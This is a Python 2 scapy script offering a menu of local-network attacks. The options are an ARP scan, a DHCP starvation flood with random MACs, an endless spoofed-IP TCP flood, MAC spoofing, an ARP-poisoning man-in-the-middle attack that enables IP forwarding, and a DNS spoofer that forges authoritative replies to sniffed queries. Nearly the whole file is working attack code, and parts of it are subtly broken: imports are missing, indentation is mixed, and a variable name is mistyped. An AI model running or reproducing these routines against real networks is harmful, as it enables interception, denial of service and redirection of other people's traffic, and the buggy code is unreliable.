try:
    user_input = input ("\n[*] Wellcome:\n[*]1_ARP SCAN\n[*]2_DHCP STARVATION\n[*]3_IP SPOOF\n[*]4_MAC SPOOF\n[*]5_MITM\n[*]6_DNS SPOOF\n[*]7_EXIT\n[*]PLEASE SELECT ONE NUMBER OF TOP LIST: ")
except KeyboardInterrupt:
    print("\n user aborted")
    sys.exit()
def main():
	if user_input==1:
		try:
			interface = raw_input ("[*] Set interface: ")
			ips = raw_input("[*] Set IP RANGE or Network: ")
		except KeyboardInterrupt:
		    print("\n[*]User Requsted Shutdown")
		    print("[*]Quitting...")
		    sys.exit(1)

		print("\n[*] Scanning...")
		start_time = datetime.now()

		conf.verb = 0

		ans,unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface = interface ,inter= 0.1)

		print("\n\tMAC\t\tIP\n")

		for snd,rcv in ans:
		    print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))

		stop_time = datetime.now()
		total_time = stop_time - start_time
		print("\n[*] Scan Completed")
		print("[*] Scan Duration: %s" %(total_time))
	elif user_input==2:
		try:
			netID = raw_input("[*] Enter Desired Interface: ")
			serverIP = raw_input("[*] Enter Server IP: ")
			startrange = raw_input("[*] Enter Start Renge: ")
			endrange = raw_input("[*] Enter End Renge: ")
		except KeyboardInterrupt:
			print "\n[*] User Requested Shutdown"
			print "[*] Exiting..."
			sys.exit(1)

		def main1():
		    layer2_broadcast = "ff:ff:ff:ff:ff:ff"
		    conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out
		    
		    IP_address_subnet = netID
		    
		    def dhcp_starvation():
			for ip in range (int(startrange),int(endrange)):
			    for i in range (0,8):
				bogus_mac_address = RandMAC()
				dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id",serverIP),("requested_addr", IP_address_subnet + str(ip)),"end"])
				sendp(dhcp_request)
				print "Requesting: " + IP_address_subnet + str(ip) + "\n"
				time.sleep(1)
				
		    dhcp_starvation()
			    
		if __name__=="__main__":
		    main1()
	elif user_input==3:
		try:
			spooed_S_IP = raw_input("[*] Enter Spoofed Source IP Address: ")
			destination_IP = raw_input("[*] Enter Destination IP Address: ")
			source_port = raw_input("[*] Enter Source Port: ")
			destination_port = raw_input("[*] Destination Port: ")
			packet_payload=raw_input("[*] Enter Packet Payload: ")
		except KeyboardInterrupt:
			print "\n[*] User Requested Shutdown"
			print "[*] Exiting..."
			sys.exit(1)
		A = spooed_S_IP # spoofed source IP address
		B = destination_IP # destination IP address
		C = int(source_port) # source port
		D = int(destination_port) # destination port
		payload = packet_payload # packet payload
		while (True):
			spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
			send(spoofed_packet)
	elif user_input==4:
		spooed_S_MAC = raw_input("[*] Enter Spoofed Source MAC Address: ")
		destination_MAC = raw_input("[*] Enter Destination MAC Address: ")
		print('[*]Spoofing MAC')
		while 1:
			dest_mac = destination_MAC
			src_mac = spooed_S_MAC
			sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc="0.0.0.0", hwsrc=src_mac, hwdst=dest_mac)/Padding(load="X"*18), verbose=0)
	elif user_input==5:
		try:
			interface = raw_input("[*] Enter Desired Interface: ")
			victimIP = raw_input("[*] Enter Victim IP: ")
			gateIP = raw_input("[*] Enter Router IP: ")
		except KeyboardInterrupt:
			print "\n[*] User Requested Shutdown"
			print "[*] Exiting..."
			sys.exit(1)
		 
		print "\n[*] Enabling IP Forwarding...\n"
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		 
		def get_mac(IP):
			conf.verb = 0
			ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
			for snd,rcv in ans:
				return rcv.sprintf(r"%Ether.src%")
		 
		def reARP():
		       
			print "\n[*] Restoring Targets..."
			victimMAC = get_mac(victimIP)
			gateMAC = get_mac(gateIP)
			send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
			send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
			print "[*] Disabling IP Forwarding..."
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			print "[*] Shutting Down..."
			sys.exit(1)
		 
		def trick(gm, vm):
			send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
			send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
		 
		def mitm():
			try:
				victimMAC = get_mac(victimIP)
			except Exception:
				os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
				print "[!] Couldn't Find Victim MAC Address"
				print "[!] Exiting..."
				sys.exit(1)
			try:
				gateMAC = get_mac(gateIP)
			except Exception:
				os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
				print "[!] Couldn't Find Gateway MAC Address"
				print "[!] Exiting..."
				sys.exit(1)
			print "[*] Poisoning Targets..."       
			while 1:
				try:
				        trick(gateMAC, victimMAC)
				        time.sleep(1.5)
				except KeyboardInterrupt:
				        reARP()
				        break
		mitm()
	elif user_input==6:
		def osCheck():
			if ( uname()[0].strip() == 'Linux' ) or ( uname()[0].strip() == 'linux ') :
				print(' Current system is Linux ... Good to go!!')
			else:
				print(' Not a Linux system ... Exiting ')
				print(' This script is designed to work on Linux ... if you wish you can modify it for your OS ')
				exit(0)


		def usage():
			print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
			print(" e.g. ./dnsSpoof eth0 10.0.0.1")


		def main():
			call('clear')
			osCheck()

			if len(argv) != 3 :
				usage()
				exit(0)
		   
			while 1:
				# Sniff the network for destination port 53 traffic
				print(' Sniffing for DNS Packet ')
				getDNSPacket = sniff(iface=argv[1], filter="dst port 53", count=1)
		
				# if the sniffed packet is a DNS Query, let's do some work
				if ( getDNSPacket[0].haslayer(DNS) ) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
					print('\n Got Query on %s ' %ctime())
		 			
					# Extract the src IP
					clientSrcIP = getDNSPacket[0].getlayer(IP).src
			
					# Extract UDP or TCP Src port
					if getDNSPacket[0].haslayer(UDP) :
						clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
					elif getDNSPacket[0].haslayer(TCP) :
						clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
					else:
						pass
						# I'm not tryint to figure out what you are ... moving on
			
					# Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
					clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id
			
					# Extract the Query Count
					clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

					# Extract client's current DNS server
					clientDNSServer = getDNSPacket[0].getlayer(IP).dst

					# Extract the DNS Query. Obviously if we will respond to a domain query, we must reply to what was asked for.
					clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.qname

					print(' Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n Current DNS Server:%s \n DNS Query:%s ' %(clientSrcIP,clientSrcPort,clientDNSQueryID,clientDNSQueryDataCount,clientDNSServer,clientDNSQuery))

					# Now that we have captured the clients request information. Let's go ahead and build our spoofed response
					# First let's set the spoofed source, which we will take from the 3rd argument entered at the command line
					spoofedDNSServerIP = argv[2].strip()

					# Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
					spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)

					# Now let's move up the IP stack and build our UDP or TCP header
					# We know our source port will be 53. However, our destination port has to match our client's. 
					# In addition, we don't know if this is UDP or TCP, so let's ensure we capture both

					if getDNSPacket[0].haslayer(UDP) : 
						spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
					elif getDNSPacket[0].haslayer(TCP) : 
						spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)

					# Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
					# This section is where your knowledge of the DNS protocol comes into play. Don't be afraid if you don't know
					# do like I did and revist the RFC :-)
					spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip(),ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=argv[2]),ar=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip()))
			
					# Now that we have built our packet, let's go ahead and send it on its merry way.
					print(' \n Sending spoofed response packet ')
					sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=argv[1].strip(), count=1)
					print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))

				else:
					pass


		if __name__ == '__main__':
			main()
	else:
	    print('Data:')
main()
